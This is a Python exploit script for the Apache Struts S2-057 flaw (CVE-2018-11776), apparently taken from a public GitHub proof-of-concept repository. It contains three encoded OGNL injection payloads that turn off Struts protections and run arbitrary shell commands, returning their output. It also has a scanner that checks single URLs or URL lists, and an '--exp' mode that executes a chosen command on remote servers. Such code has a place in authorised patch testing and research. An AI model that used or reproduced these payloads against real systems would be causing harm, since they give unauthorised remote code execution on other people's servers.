#coding=utf-8
#Author:FN
#Github:https://github.com/Fnzer0/S2-057-poc
#Modify from https://github.com/mazen160/struts-pwn_CVE-2018-11776
import argparse
import random
import requests
import sys
import re
import httplib
try:
    from urllib import parse as urlparse
except ImportError:
    import urlparse

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

TIMEOUT = 6
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
    'Accept': '*/*'
}

POC={
    "S2-057-1":'''%24%7B%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.setExcludedClasses%28%27java.lang.Shutdown%27%29%29.%28%23ou.setExcludedPackageNames%28%27sun.reflect.%27%29%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27{{CMD}}%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D''',
    "S2-057-2":'''%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27{{CMD}}%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D''',
    "S2-057-3":'''%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23cmd%3D%27{{CMD}}%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D''',
}

def parse_url(url):
    """
    Parses the URL.
    """

    # url: http://example.com/demo/struts2-showcase/index.action
    
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # Site: http://example.com
    site = scheme + '://' + urlparse.urlparse(url).netloc

    # FilePath: /demo/struts2-showcase/index.action
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    # Filename: index.action
    try:
        filename = url.split('/')[-1]
    except IndexError:
        filename = ''

    # File Dir: /demo/struts2-showcase/
    file_dir = file_path.rstrip(filename)
    if (file_dir == ''):
        file_dir = '/'

    return({"site": site,
            "file_dir": file_dir,
            "filename": filename})


def build_injection_urls(url):
    """
    Builds injection urls for the check.
    """
    parsed_url = parse_url(url)
    injection_urls = []
    url_directories = parsed_url["file_dir"].split("/")

    try:
        url_directories.remove("")
    except ValueError:
        pass

    for i in range(len(url_directories)):
        injection_entry = "/".join(url_directories[:i])

        if not injection_entry.startswith("/"):
            injection_entry = "/%s" % (injection_entry)

        if not injection_entry.endswith("/"):
            injection_entry = "%s/" % (injection_entry)

        injection_entry += "{{INJECTION_POINT}}/"  # It will be renderred later with the payload.
        injection_entry += parsed_url["filename"]

        injection_urls.append(parsed_url["site"]+injection_entry)
    return(injection_urls)


def check(url):
    random_value = int(''.join(random.choice('0123456789') for i in range(2)))
    multiplication_value = random_value * random_value
    #check all injection_url
    #injection_urls = build_injection_urls(url)
    #just check the last injection_url
    injection_urls = [build_injection_urls(url)[-1]]
    print("[%] Checking for CVE-2018-11776")
    print("[*] URL: %s" % (url))
    print("[*] Total of Attempts: (%s)" % (len(injection_urls)))
    attempts_counter = 0
    for injection_url in injection_urls:
        attempts_counter += 1
        print("[%s/%s]" % (attempts_counter, len(injection_urls)))
        testing_url = injection_url.replace("{{INJECTION_POINT}}", "${{%s*%s}}" % (random_value, random_value))
        try:
            resp = requests.get(testing_url, headers=headers, verify=False, timeout=TIMEOUT, allow_redirects=False)
        except Exception as e:
            print("EXCEPTION::::--> " + str(e))
            break
            #continue
        if str(multiplication_value) in str(resp.headers) or str(multiplication_value) in resp.content:
            print("[*] Status: Maybe vulnerable!")
            print("[*] Inject URL: %s" % injection_url)
    #return(None)

def check_poc(url):
    echo_str = 's2-057-test'
    pattern = r'(?=echo[\s\S]*%s)' % echo_str
    cmd = 'echo%20'+echo_str
    #check all injection_url
    #injection_urls = build_injection_urls(url)
    #just check the last injection_url
    injection_urls = [build_injection_urls(url)[-1]]
    print("[%] Checking poc for CVE-2018-11776")
    print("[*] URL: %s" % (url))
    print("[*] Total of Attempts: (%s)" % (len(injection_urls)))
    attempts_counter = 0
    for injection_url in injection_urls:
        attempts_counter += 1
        print("[%s/%s]" % (attempts_counter, len(injection_urls)))
        for poc_key in POC:
            payload = POC[poc_key].replace("{{CMD}}",cmd)
            testing_url = injection_url.replace("{{INJECTION_POINT}}", payload)
            try:
                resp = requests.get(testing_url, headers=headers, verify=False, timeout=TIMEOUT, allow_redirects=False)
                if poc_key == 'S2-057-1':
                    resp = requests.get(testing_url, headers=headers, verify=False, timeout=TIMEOUT, allow_redirects=False)
            except Exception as e:
                print("EXCEPTION::::--> " + str(e))
                break
                #continue
            response = resp.content
            m = re.findall(pattern,response,re.I)
            #if response.find(echo_str) is not -1:
            if echo_str in response and len(m) != response.count(echo_str):
                print("[!] Target is vulnerable")
                print("[*] Inject URL: %s" % injection_url)
                print("[*] POC key : %s" % poc_key)
                return(injection_url, poc_key)
    print("[%] Target is not vulnerable")
    return(None, None)

def exploit(url, iurl, pockey, cmd):
    if iurl and pockey:
        injection_url, poc_key = iurl, pockey
    else:
        injection_url, poc_key = check_poc(url)
    if injection_url and poc_key:
        print("[%] Exploiting...")
        payload = POC[poc_key].replace("{{CMD}}",cmd)
        testing_url = injection_url.replace("{{INJECTION_POINT}}", payload)

        try:
            resp = requests.get(testing_url, headers=headers, verify=False, timeout=TIMEOUT, allow_redirects=False)
        except Exception as e:
            print("EXCEPTION::::--> " + str(e))
            return(1)

        print("[%] Response:")
        print(resp.content)


def main(url, iurl, usedlist, cmd, do_exploit, payload):
    if url or iurl:
        if not do_exploit:
            check(url)
        else:
            exploit(url, iurl, payload, cmd)

    if usedlist:
        URLs_List = []
        try:
            f_file = open(str(usedlist), "r")
            URLs_List = f_file.read().replace("\r", "").split("\n")
            try:
                URLs_List.remove("")
            except ValueError:
                pass
            f_file.close()
        except Exception as e:
            print("Error: There was an error in reading list file.")
            print("Exception: " + str(e))
            exit(1)
        for url in URLs_List:
            if not do_exploit:
                check(url)
            else:
                exploit(url, iurl, payload, cmd)


if __name__ == "__main__":
    tips='''python S2-057-exp.py -h for help.
    
Suggest all two method to check S2-057(CVE-2018-11776)
1.expression eval
    python S2-057-exp.py -u url
2.direct execute command
    python S2-057-exp.py -u url --exp'''
    if len(sys.argv) <= 1:
        print(tips)
        exit(0)
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url",
                        dest="url",
                        help="Check a single URL.",
                        action='store')
    parser.add_argument("-i", "--iurl",
                        dest="iurl",
                        help="Check inject URL.",
                        action='store')
    parser.add_argument("-l", "--list",
                        dest="usedlist",
                        help="Check a list of URLs.",
                        action='store')
    parser.add_argument("-c", "--cmd",
                        dest="cmd",
                        help="Command to execute. (Default: 'whoami')",
                        action='store',
                        default='whoami')
    parser.add_argument("-p", "--payload",
                        dest="payload",
                        help="Use which payload to execute command.",
                        action='store')
    parser.add_argument("--exp",
                        dest="do_exploit",
                        help="Exploit.",
                        action='store_true')
    
    args = parser.parse_args()
    url = args.url if args.url else None
    iurl = args.iurl if args.iurl else None
    usedlist = args.usedlist if args.usedlist else None
    cmd = args.cmd if args.cmd else None
    payload = args.payload if args.payload else None
    do_exploit = args.do_exploit if args.do_exploit else None
    
    try:
        main(url, iurl, usedlist, cmd, do_exploit, payload)
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
